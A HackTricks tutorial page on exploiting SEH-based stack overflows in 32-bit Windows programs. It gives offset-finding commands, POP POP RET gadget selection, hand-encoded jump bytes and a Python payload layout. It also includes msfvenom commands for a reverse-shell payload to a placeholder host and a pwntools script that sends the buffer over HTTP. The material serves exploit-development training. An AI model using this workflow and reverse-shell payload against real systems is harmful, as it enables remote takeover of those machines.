---
title: "Windows SEH Overflow"
source: hacktricks.wiki
source_url: https://hacktricks.wiki/binary-exploitation/stack-overflow/windows-seh-overflow.html
fetched_at: 2026-09-20T09:50:19Z
license: unspecified
category: reversing
---

# Windows SEH-based Stack Overflow Exploitation (nSEH/SEH)

## Finding exact offsets (nSEH / SEH)

- Crash the process and verify the SEH chain is overwritten (e.g., in x32dbg/x64dbg, check the SEH view).
- Send a cyclic pattern as the overflowing data and compute offsets of the two dwords that land in nSEH and SEH.

Example with peda/GEF/pwntools on a 1000-byte POST body:[\[1\]](#references)

```
# generate pattern (any tool is fine)
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000
# or
python3 -c "from pwn import *; print(cyclic(1000).decode())"
# after crash, note the two 32-bit values from SEH view and compute offsets
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 1000 -q 0x32424163   # nSEH
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 1000 -q 0x41484241   # SEH
# ➜ offsets example: nSEH=660, SEH=664
```
Validate by placing markers at those positions (e.g., nSEH=b“BB“, SEH=b“CC“). Keep total length constant to make the crash reproducible.

## Choosing a POP POP RET (SEH gadget)

You need a POP POP RET sequence to unwind the SEH frame and return into your nSEH bytes. Find it in a module without SafeSEH and ideally without ASLR:

- Mona (Immunity/WinDbg): `!mona modules` then`!mona seh -m modulename` .<sup>[\[4\]](#references)</sup>
- x64dbg plugin ERC.Xdbg: `ERC --SEH` to list POP POP RET gadgets and SafeSEH status.<sup>[\[2\]](#references)</sup>

Pick an address that contains no badchars when written little-endian (e.g., `p32(0x004094D8)`). Prefer gadgets inside the vulnerable binary if protections allow.

## Jump-back technique (short + near jmp)

nSEH is only four bytes, which fits a two-byte short jump (`EB xx`) plus padding. If the target is hundreds of bytes away, place a five-byte near jump immediately before nSEH and use the short jump to reach it.

With nasmshell:

```
nasm> jmp -660           ; too far for short; near jmp is 5 bytes
E967FDFFFF
nasm> jmp short -8       ; target is 8 bytes before nSEH; encoded displacement is -10
EBF6
nasm> jmp -652           ; 8 bytes closer (to account for short-jmp hop)
E96FFDFFFF
```
Layout idea for a 1000-byte payload with nSEH at offset 660:[\[1\]](#references)

```
buffer_length = 1000
payload  = b"\x90"*50 + shellcode                    # NOP sled + shellcode at buffer start
payload += b"A" * (660 - 8 - len(payload))           # pad so we are 8 bytes before nSEH
payload += b"\xE9\x6F\xFD\xFF\xFF" + b"EEE"     # near jmp -652 (5B) + 3B padding
payload += b"\xEB\xF6" + b"BB"                      # nSEH: short jmp -8 + 2B pad
payload += p32(0x004094D8)                           # SEH: POP POP RET (no badchars)
payload += b"D" * (buffer_length - len(payload))
```
Execution flow:

- Exception occurs, dispatcher uses overwritten SEH.
- POP POP RET unwinds into our nSEH.
- nSEH executes `jmp short -8` into the 5-byte near jump.
- Near jump lands at the beginning of our buffer where the NOP sled + shellcode reside.

## Bad characters

Build a full badchar string and compare the stack memory after the crash, removing bytes that are mangled by the target parser. For HTTP-based overflows, `\x00\x0a\x0d` are almost always excluded.

```
badchars = bytes([x for x in range(1,256)])
payload  = b"A"*660 + b"BBBB" + b"CCCC" + badchars  # position appropriately for your case
```
## Shellcode generation (x86)

Use msfvenom with your badchars. A small NOP sled helps tolerate landing variance.

```
msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> \
  -b "\x00\x0a\x0d" -f python -v sc
```
If generating on the fly, the hex format is convenient to embed and unhex in Python:

```
msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> \
  -b "\x00\x0a\x0d" -f hex
```
## Delivering over HTTP (precise CRLF + Content-Length)

When the vulnerable vector is an HTTP request body, craft a raw request with exact CRLFs and Content-Length so the server reads the entire overflowing body.[\[1\]](#references)

```
# pip install pwntools
from pwn import remote
host, port = "<TARGET_IP>", 8080
body = b"A" * 1000  # replace with the SEH-aware buffer above
req = f"""POST / HTTP/1.1
Host: {host}:{port}
User-Agent: curl/8.5.0
Accept: */*
Content-Length: {len(body)}
Connection: close
""".replace('\n','\r\n').encode() + body
p = remote(host, port)
p.send(req)
print(p.recvall(timeout=0.5))
p.close()
```
## Tooling

- x32dbg/x64dbg to observe SEH chain and triage the crash.
- ERC.Xdbg (x64dbg plugin) to enumerate SEH gadgets: `ERC --SEH` .
- Mona as an alternative: `!mona modules` ,`!mona seh` .
- nasmshell to assemble short/near jumps and copy raw opcodes.
- pwntools to craft precise network payloads.

## Notes and caveats

- This nSEH/SEH stack-record technique applies to x86 processes. x64 uses table-based exception metadata rather than the same stack-linked registration records.
- Prefer gadgets in modules without SafeSEH and ASLR; otherwise, find an unprotected module loaded into the process.
- Service watchdogs that automatically restart on crash can make iterative exploit development easier.
- When the vulnerable input is transformed into UTF-16/Unicode, ordinary byte-oriented jumps and shellcode may no longer survive. Venetian alignment and Unicode-compatible encoders are specialized extensions of the SEH workflow; Corelan’s dedicated tutorial retains the full worked technique.<sup>[\[6\]](#references)</sup>

## References
